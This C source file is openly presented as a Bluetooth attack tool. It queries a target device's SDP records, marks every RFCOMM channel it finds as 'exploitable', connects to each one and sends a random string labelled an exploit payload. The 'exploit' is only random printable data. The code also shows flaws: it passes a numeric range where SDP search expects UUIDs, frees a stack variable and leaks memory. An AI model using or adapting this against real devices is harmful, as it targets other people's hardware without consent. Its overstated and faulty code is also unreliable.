#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>
#include <bluetooth/sdp.h>
#include <bluetooth/sdp_lib.h>
#include <time.h>

#define PAYLOAD_SIZE 256

void random_payload(char *buffer, size_t length) {
    for (size_t i = 0; i < length - 1; i++) {
        buffer[i] = (rand() % 95) + 32;
    }
    buffer[length - 1] = '\0';
}

void exploit_rfcomm(const char *target_addr, uint8_t channel) {
    struct sockaddr_rc addr = {0};
    int sock;
    char exploit_payload[PAYLOAD_SIZE];
    random_payload(exploit_payload, PAYLOAD_SIZE);
    sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
    if (sock < 0) {
        perror("Failed to create RFCOMM socket");
        return;
    }
    addr.rc_family = AF_BLUETOOTH;
    addr.rc_channel = channel;
    str2ba(target_addr, &addr.rc_bdaddr);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Connection failed (service may require authentication)");
        close(sock);
        return;
    }
    printf("Connected to %s on channel %d\n", target_addr, channel);
    if (write(sock, exploit_payload, strlen(exploit_payload)) < 0) {
        perror("Failed to send exploit payload");
    } else {
        printf("Exploit payload sent successfully: %s\n", exploit_payload);
    }
    close(sock);
}

void scan_and_exploit(const char *target_addr) {
    bdaddr_t target;
    sdp_session_t *session;
    str2ba(target_addr, &target);
    session = sdp_connect(BDADDR_ANY, &target, SDP_RETRY_IF_BUSY);
    if (!session) {
        perror("Failed to connect to SDP server");
        return;
    }
    uint32_t range = 0x0000ffff;
    sdp_list_t *search_list = sdp_list_append(NULL, &range);
    sdp_list_t *attrid_list = sdp_list_append(NULL, &range);
    sdp_list_t *response_list = NULL;
    if (sdp_service_search_attr_req(session, search_list, SDP_ATTR_REQ_RANGE, attrid_list, &response_list) < 0) {
        perror("SDP query failed");
        sdp_close(session);
        return;
    }
    sdp_list_t *r = response_list;
    while (r) {
        sdp_record_t *rec = (sdp_record_t *)r->data;
        uint8_t channel;
        sdp_list_t *proto_list = NULL;
        if (sdp_get_access_protos(rec , &proto_list) == 0){
            int port = sdp_get_proto_port(proto_list , RFCOMM_UUID);
            if(port > 0){
                printf("Exploitable RFCOMM Service Found on Channel %d\n" , port);
                exploit_rfcomm(target_addr , port);
            }
        }
        r = r->next;
    }
    sdp_list_free(search_list, free);
    sdp_list_free(attrid_list, free);
    sdp_list_free(response_list, free);
    sdp_close(session);
}
